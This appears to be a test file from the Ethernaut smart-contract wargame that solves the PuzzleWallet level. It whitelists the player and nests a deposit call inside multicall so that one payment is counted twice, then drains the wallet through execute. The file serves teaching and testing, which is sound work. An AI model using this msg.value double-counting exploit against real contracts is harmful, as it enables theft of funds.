const ethutil = require('ethereumjs-util')
const PuzzleWalletFactory = artifacts.require('./levels/PuzzleWalletFactory.sol')
const PuzzleWallet = artifacts.require('./attacks/PuzzleWallet.sol')

const Ethernaut = artifacts.require('./Ethernaut.sol')
const { BN, constants, expectEvent, expectRevert } = require('openzeppelin-test-helpers')
const utils = require('../utils/TestUtils')

contract('PuzzleWallet', function(accounts) {

  let ethernaut
  let level
  let owner = accounts[1]
  let player = accounts[0]

  beforeEach(async function() {
    ethernaut = await Ethernaut.new();
    level = await PuzzleWalletFactory.new()
    await ethernaut.registerLevel(level.address)
  });

  it('should allow the player to solve the level', async function() {

    const instance = await utils.createLevelInstance(
      ethernaut, level.address, player, PuzzleWallet,
      {from: player, value: web3.utils.toWei('1', 'ether')}
    )

    assert.equal(await instance.owner(), level.address)
    assert.equal(web3.utils.toWei('1', 'ether'), (await instance.balances(level.address)).toString())

    // TODO: take ownership in a real way
    await instance.takeOwnership({from: player})

    // Player whitelists herself
    await instance.addToWhitelist(player, { from: player })

    const { data: depositData } = await instance.deposit.request(web3.utils.toWei('1', 'ether'))
    const { data: nestedMulticallData } = await instance.multicall.request([ depositData ])
    const { data: executeData } = await instance.execute.request(player, web3.utils.toWei('2', 'ether'), [])

    const calls = [
      depositData,
      nestedMulticallData,
      executeData,
    ]

    await instance.multicall(calls, { from: player, value: web3.utils.toWei('1', 'ether')})

    // Factory check
    const ethCompleted = await utils.submitLevelInstance(
      ethernaut,
      level.address,
      instance.address,
      player
    )
    assert.equal(ethCompleted, true)
  });
});
